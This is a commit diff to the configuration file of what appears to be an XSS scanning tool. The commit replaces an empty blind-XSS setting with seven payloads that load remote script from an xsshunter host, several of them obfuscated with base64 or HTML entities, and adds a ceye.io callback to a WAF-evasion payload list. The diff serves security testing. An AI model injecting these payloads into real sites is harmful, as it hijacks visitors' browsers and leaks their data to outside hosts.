5add8da660003a034b701ef232490d3ceb23a8e9
fngoo <38164287+fngoo@users.noreply.github.com>
2019-09-16 18:42:00 +0800

    Update config.py

--- core/config.py
+++ core/config.py
@@ -2,7 +2,14 @@ changes = '''Negligible DOM XSS false positives;x10 faster crawling'''
 globalVariables = {}  # it holds variables during runtime for collaboration across modules
 
 defaultEditor = 'nano'
-blindPayload = ''  # your blind XSS payload
+blindPayload = (  # Payloads for filter & WAF evasion
+    '"><script src=https://xsshunternihao.xss.ht></script>',
+    'javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xsshunternihao.xss.ht\';document.body.appendChild(a)')',
+    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVybmloYW8ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>',
+    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVybmloYW8ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>',
+    '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xsshunternihao.xss.ht");a.send();</script>',
+    '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xsshunternihao.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
+    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVybmloYW8ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>')
 xsschecker = 'v3dm0s'  # A non malicious string to check for reflections and stuff
 
 #  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies
@@ -42,7 +49,7 @@ functions = (  # JavaScript functions to get a popup
     '(prompt)``', 'a=prompt,a()')
 
 payloads = (  # Payloads for filter & WAF evasion
-    '\'"</Script><Html Onmouseover=(confirm)()//'
+    '\'"</Script><Html Onmouseover=(confirm)()//',
     '<imG/sRc=l oNerrOr=(prompt)() x>',
     '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
     '<deTails open oNToggle=confi\u0072m()>',
@@ -57,6 +64,7 @@ payloads = (  # Payloads for filter & WAF evasion
     '<sCriPt sRc=//14.rs>',
     '<embed//sRc=//14.rs>',
     'q1b3q6.ceye.io',
+    'https://q1b3q6.ceye.io',           
     '<base href=//14.rs/><script src=/>',
     '<object//data=//14.rs>',
     '<s=" onclick=confirm``>clickme',
